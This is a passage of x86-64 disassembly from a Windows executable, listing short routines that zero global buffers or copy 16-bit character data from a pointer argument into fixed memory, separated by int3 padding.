   140008216:	00 00 00 
   140008219:	c3                   	ret
   14000821a:	cc                   	int3
   14000821b:	cc                   	int3
   14000821c:	cc                   	int3
   14000821d:	cc                   	int3
   14000821e:	cc                   	int3
   14000821f:	cc                   	int3
   140008220:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008223:	0f 11 05 20 5f 28 00 	movups %xmm0,0x285f20(%rip)        # 0x14028e14a
   14000822a:	0f 29 05 0f 5f 28 00 	movaps %xmm0,0x285f0f(%rip)        # 0x14028e140
   140008231:	c3                   	ret
   140008232:	cc                   	int3
   140008233:	cc                   	int3
   140008234:	cc                   	int3
   140008235:	cc                   	int3
   140008236:	cc                   	int3
   140008237:	cc                   	int3
   140008238:	cc                   	int3
   140008239:	cc                   	int3
   14000823a:	cc                   	int3
   14000823b:	cc                   	int3
   14000823c:	cc                   	int3
   14000823d:	cc                   	int3
   14000823e:	cc                   	int3
   14000823f:	cc                   	int3
   140008240:	c6 05 4f 5f 28 00 01 	movb   $0x1,0x285f4f(%rip)        # 0x14028e196
   140008247:	0f b7 01             	movzwl (%rcx),%eax
   14000824a:	66 89 05 0f 5f 28 00 	mov    %ax,0x285f0f(%rip)        # 0x14028e160
   140008251:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008255:	66 89 05 06 5f 28 00 	mov    %ax,0x285f06(%rip)        # 0x14028e162
   14000825c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008260:	66 89 05 fd 5e 28 00 	mov    %ax,0x285efd(%rip)        # 0x14028e164
   140008267:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000826b:	66 89 05 f4 5e 28 00 	mov    %ax,0x285ef4(%rip)        # 0x14028e166
   140008272:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008276:	66 89 05 eb 5e 28 00 	mov    %ax,0x285eeb(%rip)        # 0x14028e168
   14000827d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008281:	66 89 05 e2 5e 28 00 	mov    %ax,0x285ee2(%rip)        # 0x14028e16a
   140008288:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000828c:	66 89 05 d9 5e 28 00 	mov    %ax,0x285ed9(%rip)        # 0x14028e16c
   140008293:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008297:	66 89 05 d0 5e 28 00 	mov    %ax,0x285ed0(%rip)        # 0x14028e16e
   14000829e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400082a2:	66 89 05 c7 5e 28 00 	mov    %ax,0x285ec7(%rip)        # 0x14028e170
   1400082a9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400082ad:	66 89 05 be 5e 28 00 	mov    %ax,0x285ebe(%rip)        # 0x14028e172
   1400082b4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400082b8:	66 89 05 b5 5e 28 00 	mov    %ax,0x285eb5(%rip)        # 0x14028e174
   1400082bf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400082c3:	66 89 05 ac 5e 28 00 	mov    %ax,0x285eac(%rip)        # 0x14028e176
   1400082ca:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400082ce:	66 89 05 a3 5e 28 00 	mov    %ax,0x285ea3(%rip)        # 0x14028e178
   1400082d5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400082d9:	66 89 05 9a 5e 28 00 	mov    %ax,0x285e9a(%rip)        # 0x14028e17a
   1400082e0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400082e4:	66 89 05 91 5e 28 00 	mov    %ax,0x285e91(%rip)        # 0x14028e17c
   1400082eb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400082ef:	66 89 05 88 5e 28 00 	mov    %ax,0x285e88(%rip)        # 0x14028e17e
   1400082f6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400082fa:	66 89 05 7f 5e 28 00 	mov    %ax,0x285e7f(%rip)        # 0x14028e180
   140008301:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008305:	66 89 05 76 5e 28 00 	mov    %ax,0x285e76(%rip)        # 0x14028e182
   14000830c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008310:	66 89 05 6d 5e 28 00 	mov    %ax,0x285e6d(%rip)        # 0x14028e184
   140008317:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000831b:	66 89 05 64 5e 28 00 	mov    %ax,0x285e64(%rip)        # 0x14028e186
   140008322:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008326:	66 89 05 5b 5e 28 00 	mov    %ax,0x285e5b(%rip)        # 0x14028e188
   14000832d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008331:	66 89 05 52 5e 28 00 	mov    %ax,0x285e52(%rip)        # 0x14028e18a
   140008338:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000833c:	66 89 05 49 5e 28 00 	mov    %ax,0x285e49(%rip)        # 0x14028e18c
   140008343:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008347:	66 89 05 40 5e 28 00 	mov    %ax,0x285e40(%rip)        # 0x14028e18e
   14000834e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008352:	66 89 05 37 5e 28 00 	mov    %ax,0x285e37(%rip)        # 0x14028e190
   140008359:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000835d:	66 89 05 2e 5e 28 00 	mov    %ax,0x285e2e(%rip)        # 0x14028e192
   140008364:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008368:	66 89 05 25 5e 28 00 	mov    %ax,0x285e25(%rip)        # 0x14028e194
   14000836f:	c3                   	ret
   140008370:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008373:	0f 29 05 06 5e 28 00 	movaps %xmm0,0x285e06(%rip)        # 0x14028e180
   14000837a:	0f 29 05 ef 5d 28 00 	movaps %xmm0,0x285def(%rip)        # 0x14028e170
   140008381:	0f 29 05 d8 5d 28 00 	movaps %xmm0,0x285dd8(%rip)        # 0x14028e160
   140008388:	48 c7 05 fb 5d 28 00 	movq   $0x0,0x285dfb(%rip)        # 0x14028e18e
   14000838f:	00 00 00 00 
   140008393:	c3                   	ret
   140008394:	cc                   	int3
   140008395:	cc                   	int3
   140008396:	cc                   	int3
   140008397:	cc                   	int3
   140008398:	cc                   	int3
   140008399:	cc                   	int3
   14000839a:	cc                   	int3
   14000839b:	cc                   	int3
   14000839c:	cc                   	int3
   14000839d:	cc                   	int3
   14000839e:	cc                   	int3
   14000839f:	cc                   	int3
   1400083a0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400083a3:	0f 29 05 f6 5d 28 00 	movaps %xmm0,0x285df6(%rip)        # 0x14028e1a0
   1400083aa:	66 c7 05 fd 5d 28 00 	movw   $0x0,0x285dfd(%rip)        # 0x14028e1b0
   1400083b1:	00 00 
   1400083b3:	c3                   	ret
   1400083b4:	cc                   	int3
   1400083b5:	cc                   	int3
   1400083b6:	cc                   	int3
   1400083b7:	cc                   	int3
   1400083b8:	cc                   	int3
   1400083b9:	cc                   	int3
   1400083ba:	cc                   	int3
   1400083bb:	cc                   	int3
   1400083bc:	cc                   	int3
   1400083bd:	cc                   	int3
   1400083be:	cc                   	int3
   1400083bf:	cc                   	int3
   1400083c0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400083c3:	0f 11 05 00 5e 28 00 	movups %xmm0,0x285e00(%rip)        # 0x14028e1ca
   1400083ca:	0f 29 05 ef 5d 28 00 	movaps %xmm0,0x285def(%rip)        # 0x14028e1c0
   1400083d1:	c3                   	ret
   1400083d2:	cc                   	int3
   1400083d3:	cc                   	int3
   1400083d4:	cc                   	int3
   1400083d5:	cc                   	int3
   1400083d6:	cc                   	int3
   1400083d7:	cc                   	int3
   1400083d8:	cc                   	int3
   1400083d9:	cc                   	int3
   1400083da:	cc                   	int3
   1400083db:	cc                   	int3
   1400083dc:	cc                   	int3
   1400083dd:	cc                   	int3
   1400083de:	cc                   	int3
   1400083df:	cc                   	int3
   1400083e0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400083e3:	0f 29 05 f6 5d 28 00 	movaps %xmm0,0x285df6(%rip)        # 0x14028e1e0
   1400083ea:	c3                   	ret
   1400083eb:	cc                   	int3
   1400083ec:	cc                   	int3
   1400083ed:	cc                   	int3
   1400083ee:	cc                   	int3
   1400083ef:	cc                   	int3
   1400083f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400083f3:	0f 29 05 c6 5e 28 00 	movaps %xmm0,0x285ec6(%rip)        # 0x14028e2c0
   1400083fa:	0f 29 05 af 5e 28 00 	movaps %xmm0,0x285eaf(%rip)        # 0x14028e2b0
   140008401:	0f 29 05 98 5e 28 00 	movaps %xmm0,0x285e98(%rip)        # 0x14028e2a0
   140008408:	0f 29 05 81 5e 28 00 	movaps %xmm0,0x285e81(%rip)        # 0x14028e290
   14000840f:	0f 29 05 6a 5e 28 00 	movaps %xmm0,0x285e6a(%rip)        # 0x14028e280
   140008416:	0f 29 05 53 5e 28 00 	movaps %xmm0,0x285e53(%rip)        # 0x14028e270
   14000841d:	0f 29 05 3c 5e 28 00 	movaps %xmm0,0x285e3c(%rip)        # 0x14028e260
   140008424:	0f 29 05 25 5e 28 00 	movaps %xmm0,0x285e25(%rip)        # 0x14028e250
   14000842b:	0f 29 05 0e 5e 28 00 	movaps %xmm0,0x285e0e(%rip)        # 0x14028e240
   140008432:	0f 29 05 f7 5d 28 00 	movaps %xmm0,0x285df7(%rip)        # 0x14028e230
   140008439:	0f 29 05 e0 5d 28 00 	movaps %xmm0,0x285de0(%rip)        # 0x14028e220
   140008440:	0f 29 05 c9 5d 28 00 	movaps %xmm0,0x285dc9(%rip)        # 0x14028e210
   140008447:	0f 29 05 b2 5d 28 00 	movaps %xmm0,0x285db2(%rip)        # 0x14028e200
   14000844e:	48 c7 05 75 5e 28 00 	movq   $0x0,0x285e75(%rip)        # 0x14028e2ce
   140008455:	00 00 00 00 
   140008459:	c3                   	ret
   14000845a:	cc                   	int3
   14000845b:	cc                   	int3
   14000845c:	cc                   	int3
   14000845d:	cc                   	int3
   14000845e:	cc                   	int3
   14000845f:	cc                   	int3
   140008460:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008463:	0f 29 05 c6 5e 28 00 	movaps %xmm0,0x285ec6(%rip)        # 0x14028e330
   14000846a:	0f 29 05 af 5e 28 00 	movaps %xmm0,0x285eaf(%rip)        # 0x14028e320
   140008471:	0f 29 05 98 5e 28 00 	movaps %xmm0,0x285e98(%rip)        # 0x14028e310
   140008478:	0f 29 05 81 5e 28 00 	movaps %xmm0,0x285e81(%rip)        # 0x14028e300
   14000847f:	0f 29 05 6a 5e 28 00 	movaps %xmm0,0x285e6a(%rip)        # 0x14028e2f0
   140008486:	0f 29 05 53 5e 28 00 	movaps %xmm0,0x285e53(%rip)        # 0x14028e2e0
   14000848d:	48 c7 05 a6 5e 28 00 	movq   $0x0,0x285ea6(%rip)        # 0x14028e33e
   140008494:	00 00 00 00 
   140008498:	c3                   	ret
   140008499:	cc                   	int3
   14000849a:	cc                   	int3
   14000849b:	cc                   	int3
   14000849c:	cc                   	int3
   14000849d:	cc                   	int3
   14000849e:	cc                   	int3
   14000849f:	cc                   	int3
   1400084a0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400084a3:	0f 29 05 a6 5e 28 00 	movaps %xmm0,0x285ea6(%rip)        # 0x14028e350
   1400084aa:	66 c7 05 ad 5e 28 00 	movw   $0x0,0x285ead(%rip)        # 0x14028e360
   1400084b1:	00 00 
   1400084b3:	c3                   	ret
   1400084b4:	cc                   	int3
   1400084b5:	cc                   	int3
   1400084b6:	cc                   	int3
   1400084b7:	cc                   	int3
   1400084b8:	cc                   	int3
   1400084b9:	cc                   	int3
   1400084ba:	cc                   	int3
   1400084bb:	cc                   	int3
   1400084bc:	cc                   	int3
   1400084bd:	cc                   	int3
   1400084be:	cc                   	int3
   1400084bf:	cc                   	int3
   1400084c0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400084c3:	0f 29 05 f6 5e 28 00 	movaps %xmm0,0x285ef6(%rip)        # 0x14028e3c0
   1400084ca:	0f 29 05 df 5e 28 00 	movaps %xmm0,0x285edf(%rip)        # 0x14028e3b0
   1400084d1:	0f 29 05 c8 5e 28 00 	movaps %xmm0,0x285ec8(%rip)        # 0x14028e3a0
   1400084d8:	0f 29 05 b1 5e 28 00 	movaps %xmm0,0x285eb1(%rip)        # 0x14028e390
   1400084df:	0f 29 05 9a 5e 28 00 	movaps %xmm0,0x285e9a(%rip)        # 0x14028e380
   1400084e6:	0f 29 05 83 5e 28 00 	movaps %xmm0,0x285e83(%rip)        # 0x14028e370
   1400084ed:	c7 05 d9 5e 28 00 00 	movl   $0x0,0x285ed9(%rip)        # 0x14028e3d0
   1400084f4:	00 00 00 
   1400084f7:	c3                   	ret
   1400084f8:	cc                   	int3
   1400084f9:	cc                   	int3
   1400084fa:	cc                   	int3
   1400084fb:	cc                   	int3
   1400084fc:	cc                   	int3
   1400084fd:	cc                   	int3
   1400084fe:	cc                   	int3
   1400084ff:	cc                   	int3
   140008500:	c6 05 03 5f 28 00 01 	movb   $0x1,0x285f03(%rip)        # 0x14028e40a
   140008507:	0f b7 01             	movzwl (%rcx),%eax
   14000850a:	66 89 05 cf 5e 28 00 	mov    %ax,0x285ecf(%rip)        # 0x14028e3e0
   140008511:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008515:	66 89 05 c6 5e 28 00 	mov    %ax,0x285ec6(%rip)        # 0x14028e3e2
   14000851c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008520:	66 89 05 bd 5e 28 00 	mov    %ax,0x285ebd(%rip)        # 0x14028e3e4
   140008527:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000852b:	66 89 05 b4 5e 28 00 	mov    %ax,0x285eb4(%rip)        # 0x14028e3e6
   140008532:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008536:	66 89 05 ab 5e 28 00 	mov    %ax,0x285eab(%rip)        # 0x14028e3e8
   14000853d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008541:	66 89 05 a2 5e 28 00 	mov    %ax,0x285ea2(%rip)        # 0x14028e3ea
   140008548:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000854c:	66 89 05 99 5e 28 00 	mov    %ax,0x285e99(%rip)        # 0x14028e3ec
   140008553:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008557:	66 89 05 90 5e 28 00 	mov    %ax,0x285e90(%rip)        # 0x14028e3ee
   14000855e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008562:	66 89 05 87 5e 28 00 	mov    %ax,0x285e87(%rip)        # 0x14028e3f0
   140008569:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000856d:	66 89 05 7e 5e 28 00 	mov    %ax,0x285e7e(%rip)        # 0x14028e3f2
   140008574:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008578:	66 89 05 75 5e 28 00 	mov    %ax,0x285e75(%rip)        # 0x14028e3f4
   14000857f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008583:	66 89 05 6c 5e 28 00 	mov    %ax,0x285e6c(%rip)        # 0x14028e3f6
   14000858a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000858e:	66 89 05 63 5e 28 00 	mov    %ax,0x285e63(%rip)        # 0x14028e3f8
   140008595:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008599:	66 89 05 5a 5e 28 00 	mov    %ax,0x285e5a(%rip)        # 0x14028e3fa
   1400085a0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400085a4:	66 89 05 51 5e 28 00 	mov    %ax,0x285e51(%rip)        # 0x14028e3fc
   1400085ab:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400085af:	66 89 05 48 5e 28 00 	mov    %ax,0x285e48(%rip)        # 0x14028e3fe
   1400085b6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400085ba:	66 89 05 3f 5e 28 00 	mov    %ax,0x285e3f(%rip)        # 0x14028e400
   1400085c1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400085c5:	66 89 05 36 5e 28 00 	mov    %ax,0x285e36(%rip)        # 0x14028e402
   1400085cc:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   1400085d0:	66 89 05 2d 5e 28 00 	mov    %ax,0x285e2d(%rip)        # 0x14028e404
   1400085d7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   1400085db:	66 89 05 24 5e 28 00 	mov    %ax,0x285e24(%rip)        # 0x14028e406
   1400085e2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   1400085e6:	66 89 05 1b 5e 28 00 	mov    %ax,0x285e1b(%rip)        # 0x14028e408
   1400085ed:	c3                   	ret
   1400085ee:	cc                   	int3
   1400085ef:	cc                   	int3
   1400085f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400085f3:	0f 11 05 00 5e 28 00 	movups %xmm0,0x285e00(%rip)        # 0x14028e3fa
   1400085fa:	0f 29 05 ef 5d 28 00 	movaps %xmm0,0x285def(%rip)        # 0x14028e3f0
   140008601:	0f 29 05 d8 5d 28 00 	movaps %xmm0,0x285dd8(%rip)        # 0x14028e3e0
   140008608:	c3                   	ret
   140008609:	cc                   	int3
   14000860a:	cc                   	int3
   14000860b:	cc                   	int3
   14000860c:	cc                   	int3
   14000860d:	cc                   	int3
   14000860e:	cc                   	int3
   14000860f:	cc                   	int3
   140008610:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008613:	0f 11 05 04 5e 28 00 	movups %xmm0,0x285e04(%rip)        # 0x14028e41e
   14000861a:	0f 29 05 ef 5d 28 00 	movaps %xmm0,0x285def(%rip)        # 0x14028e410
   140008621:	c3                   	ret
   140008622:	cc                   	int3
   140008623:	cc                   	int3
   140008624:	cc                   	int3
   140008625:	cc                   	int3
   140008626:	cc                   	int3
   140008627:	cc                   	int3
   140008628:	cc                   	int3
   140008629:	cc                   	int3
   14000862a:	cc                   	int3
   14000862b:	cc                   	int3
   14000862c:	cc                   	int3
   14000862d:	cc                   	int3
   14000862e:	cc                   	int3
   14000862f:	cc                   	int3
   140008630:	c6 05 23 5e 28 00 01 	movb   $0x1,0x285e23(%rip)        # 0x14028e45a
   140008637:	0f b7 01             	movzwl (%rcx),%eax
   14000863a:	66 89 05 ef 5d 28 00 	mov    %ax,0x285def(%rip)        # 0x14028e430
   140008641:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008645:	66 89 05 e6 5d 28 00 	mov    %ax,0x285de6(%rip)        # 0x14028e432
   14000864c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008650:	66 89 05 dd 5d 28 00 	mov    %ax,0x285ddd(%rip)        # 0x14028e434
   140008657:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000865b:	66 89 05 d4 5d 28 00 	mov    %ax,0x285dd4(%rip)        # 0x14028e436
   140008662:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008666:	66 89 05 cb 5d 28 00 	mov    %ax,0x285dcb(%rip)        # 0x14028e438
   14000866d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008671:	66 89 05 c2 5d 28 00 	mov    %ax,0x285dc2(%rip)        # 0x14028e43a
   140008678:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000867c:	66 89 05 b9 5d 28 00 	mov    %ax,0x285db9(%rip)        # 0x14028e43c
   140008683:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008687:	66 89 05 b0 5d 28 00 	mov    %ax,0x285db0(%rip)        # 0x14028e43e
   14000868e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008692:	66 89 05 a7 5d 28 00 	mov    %ax,0x285da7(%rip)        # 0x14028e440
   140008699:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000869d:	66 89 05 9e 5d 28 00 	mov    %ax,0x285d9e(%rip)        # 0x14028e442
   1400086a4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400086a8:	66 89 05 95 5d 28 00 	mov    %ax,0x285d95(%rip)        # 0x14028e444
   1400086af:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400086b3:	66 89 05 8c 5d 28 00 	mov    %ax,0x285d8c(%rip)        # 0x14028e446
   1400086ba:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400086be:	66 89 05 83 5d 28 00 	mov    %ax,0x285d83(%rip)        # 0x14028e448
   1400086c5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400086c9:	66 89 05 7a 5d 28 00 	mov    %ax,0x285d7a(%rip)        # 0x14028e44a
   1400086d0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400086d4:	66 89 05 71 5d 28 00 	mov    %ax,0x285d71(%rip)        # 0x14028e44c
   1400086db:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400086df:	66 89 05 68 5d 28 00 	mov    %ax,0x285d68(%rip)        # 0x14028e44e
   1400086e6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400086ea:	66 89 05 5f 5d 28 00 	mov    %ax,0x285d5f(%rip)        # 0x14028e450
   1400086f1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400086f5:	66 89 05 56 5d 28 00 	mov    %ax,0x285d56(%rip)        # 0x14028e452
   1400086fc:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008700:	66 89 05 4d 5d 28 00 	mov    %ax,0x285d4d(%rip)        # 0x14028e454
   140008707:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000870b:	66 89 05 44 5d 28 00 	mov    %ax,0x285d44(%rip)        # 0x14028e456
   140008712:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008716:	66 89 05 3b 5d 28 00 	mov    %ax,0x285d3b(%rip)        # 0x14028e458
   14000871d:	c3                   	ret
   14000871e:	cc                   	int3
   14000871f:	cc                   	int3
   140008720:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008723:	0f 11 05 20 5d 28 00 	movups %xmm0,0x285d20(%rip)        # 0x14028e44a
   14000872a:	0f 29 05 0f 5d 28 00 	movaps %xmm0,0x285d0f(%rip)        # 0x14028e440
   140008731:	0f 29 05 f8 5c 28 00 	movaps %xmm0,0x285cf8(%rip)        # 0x14028e430
   140008738:	c3                   	ret
   140008739:	cc                   	int3
   14000873a:	cc                   	int3
   14000873b:	cc                   	int3
   14000873c:	cc                   	int3
   14000873d:	cc                   	int3
   14000873e:	cc                   	int3
   14000873f:	cc                   	int3
   140008740:	c6 05 3b 5d 28 00 01 	movb   $0x1,0x285d3b(%rip)        # 0x14028e482
   140008747:	0f b7 01             	movzwl (%rcx),%eax
   14000874a:	66 89 05 0f 5d 28 00 	mov    %ax,0x285d0f(%rip)        # 0x14028e460
   140008751:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008755:	66 89 05 06 5d 28 00 	mov    %ax,0x285d06(%rip)        # 0x14028e462
   14000875c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008760:	66 89 05 fd 5c 28 00 	mov    %ax,0x285cfd(%rip)        # 0x14028e464
   140008767:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000876b:	66 89 05 f4 5c 28 00 	mov    %ax,0x285cf4(%rip)        # 0x14028e466
   140008772:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008776:	66 89 05 eb 5c 28 00 	mov    %ax,0x285ceb(%rip)        # 0x14028e468
   14000877d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008781:	66 89 05 e2 5c 28 00 	mov    %ax,0x285ce2(%rip)        # 0x14028e46a
   140008788:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000878c:	66 89 05 d9 5c 28 00 	mov    %ax,0x285cd9(%rip)        # 0x14028e46c
   140008793:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008797:	66 89 05 d0 5c 28 00 	mov    %ax,0x285cd0(%rip)        # 0x14028e46e
   14000879e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400087a2:	66 89 05 c7 5c 28 00 	mov    %ax,0x285cc7(%rip)        # 0x14028e470
   1400087a9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400087ad:	66 89 05 be 5c 28 00 	mov    %ax,0x285cbe(%rip)        # 0x14028e472
   1400087b4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400087b8:	66 89 05 b5 5c 28 00 	mov    %ax,0x285cb5(%rip)        # 0x14028e474
   1400087bf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400087c3:	66 89 05 ac 5c 28 00 	mov    %ax,0x285cac(%rip)        # 0x14028e476
   1400087ca:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400087ce:	66 89 05 a3 5c 28 00 	mov    %ax,0x285ca3(%rip)        # 0x14028e478
   1400087d5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400087d9:	66 89 05 9a 5c 28 00 	mov    %ax,0x285c9a(%rip)        # 0x14028e47a
   1400087e0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400087e4:	66 89 05 91 5c 28 00 	mov    %ax,0x285c91(%rip)        # 0x14028e47c
   1400087eb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400087ef:	66 89 05 88 5c 28 00 	mov    %ax,0x285c88(%rip)        # 0x14028e47e
   1400087f6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400087fa:	66 89 05 7f 5c 28 00 	mov    %ax,0x285c7f(%rip)        # 0x14028e480
   140008801:	c3                   	ret
   140008802:	cc                   	int3
   140008803:	cc                   	int3
   140008804:	cc                   	int3
   140008805:	cc                   	int3
   140008806:	cc                   	int3
   140008807:	cc                   	int3
   140008808:	cc                   	int3
   140008809:	cc                   	int3
   14000880a:	cc                   	int3
   14000880b:	cc                   	int3
   14000880c:	cc                   	int3
   14000880d:	cc                   	int3
   14000880e:	cc                   	int3
   14000880f:	cc                   	int3
   140008810:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008813:	0f 29 05 56 5c 28 00 	movaps %xmm0,0x285c56(%rip)        # 0x14028e470
   14000881a:	0f 29 05 3f 5c 28 00 	movaps %xmm0,0x285c3f(%rip)        # 0x14028e460
   140008821:	66 c7 05 56 5c 28 00 	movw   $0x0,0x285c56(%rip)        # 0x14028e480
   140008828:	00 00 
   14000882a:	c3                   	ret
   14000882b:	cc                   	int3
   14000882c:	cc                   	int3
   14000882d:	cc                   	int3
   14000882e:	cc                   	int3
   14000882f:	cc                   	int3
   140008830:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008833:	0f 11 05 60 5c 28 00 	movups %xmm0,0x285c60(%rip)        # 0x14028e49a
   14000883a:	0f 29 05 4f 5c 28 00 	movaps %xmm0,0x285c4f(%rip)        # 0x14028e490
   140008841:	c3                   	ret
   140008842:	cc                   	int3
   140008843:	cc                   	int3
   140008844:	cc                   	int3
   140008845:	cc                   	int3
   140008846:	cc                   	int3
   140008847:	cc                   	int3
   140008848:	cc                   	int3
   140008849:	cc                   	int3
   14000884a:	cc                   	int3
   14000884b:	cc                   	int3
   14000884c:	cc                   	int3
   14000884d:	cc                   	int3
   14000884e:	cc                   	int3
   14000884f:	cc                   	int3
   140008850:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008853:	0f 11 05 62 5c 28 00 	movups %xmm0,0x285c62(%rip)        # 0x14028e4bc
   14000885a:	0f 29 05 4f 5c 28 00 	movaps %xmm0,0x285c4f(%rip)        # 0x14028e4b0
   140008861:	c3                   	ret
   140008862:	cc                   	int3
   140008863:	cc                   	int3
   140008864:	cc                   	int3
   140008865:	cc                   	int3
   140008866:	cc                   	int3
   140008867:	cc                   	int3
   140008868:	cc                   	int3
   140008869:	cc                   	int3
   14000886a:	cc                   	int3
   14000886b:	cc                   	int3
   14000886c:	cc                   	int3
   14000886d:	cc                   	int3
   14000886e:	cc                   	int3
   14000886f:	cc                   	int3
   140008870:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008873:	0f 29 05 b6 5c 28 00 	movaps %xmm0,0x285cb6(%rip)        # 0x14028e530
   14000887a:	0f 29 05 9f 5c 28 00 	movaps %xmm0,0x285c9f(%rip)        # 0x14028e520
   140008881:	0f 29 05 88 5c 28 00 	movaps %xmm0,0x285c88(%rip)        # 0x14028e510
   140008888:	0f 29 05 71 5c 28 00 	movaps %xmm0,0x285c71(%rip)        # 0x14028e500
   14000888f:	0f 29 05 5a 5c 28 00 	movaps %xmm0,0x285c5a(%rip)        # 0x14028e4f0
   140008896:	0f 29 05 43 5c 28 00 	movaps %xmm0,0x285c43(%rip)        # 0x14028e4e0
   14000889d:	0f 29 05 2c 5c 28 00 	movaps %xmm0,0x285c2c(%rip)        # 0x14028e4d0
   1400088a4:	48 c7 05 8f 5c 28 00 	movq   $0x0,0x285c8f(%rip)        # 0x14028e53e
   1400088ab:	00 00 00 00 
   1400088af:	c3                   	ret
   1400088b0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400088b3:	0f 29 05 96 5c 28 00 	movaps %xmm0,0x285c96(%rip)        # 0x14028e550
   1400088ba:	48 c7 05 99 5c 28 00 	movq   $0x0,0x285c99(%rip)        # 0x14028e55e
   1400088c1:	00 00 00 00 
   1400088c5:	c3                   	ret
   1400088c6:	cc                   	int3
   1400088c7:	cc                   	int3
   1400088c8:	cc                   	int3
   1400088c9:	cc                   	int3
   1400088ca:	cc                   	int3
